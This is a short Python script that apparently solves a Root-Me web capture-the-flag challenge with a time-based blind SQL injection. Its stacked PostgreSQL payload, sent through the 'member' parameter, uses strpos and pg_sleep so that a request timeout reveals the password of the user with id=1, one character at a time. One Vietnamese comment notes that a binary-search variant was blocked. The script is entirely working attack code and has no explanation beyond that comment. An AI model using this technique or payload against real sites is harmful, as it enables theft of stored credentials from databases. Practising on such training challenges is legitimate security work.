import requests

url = 'http://challenge01.root-me.org/web-serveur/ch40/'

flag = ''

for i in range(1,30):
	print('attemp at: %d' %(i))
	for j in range(32,127): # nếu là substring thì ta tìm kiếm nhị phân(ít hơn số lần request) nhưng bị blocked
		payload = "1; SELECT CASE WHEN strpos((select password from users where id=1 limit 1),$$%s$$)=%d THEN pg_sleep(999999) ELSE pg_sleep(0) END;-- -" %(chr(j),i)
		params = {'action':'member','member':payload}
		try:
			resp = requests.get(url, params=params, timeout=2)
		except:
			flag += chr(j)
			print('FLAG: ' + flag); print()
			break
		if j==126:
			flag += '~'
			print('Not found at %d(~)' %i)
			print('FLAG: ' + flag); print()
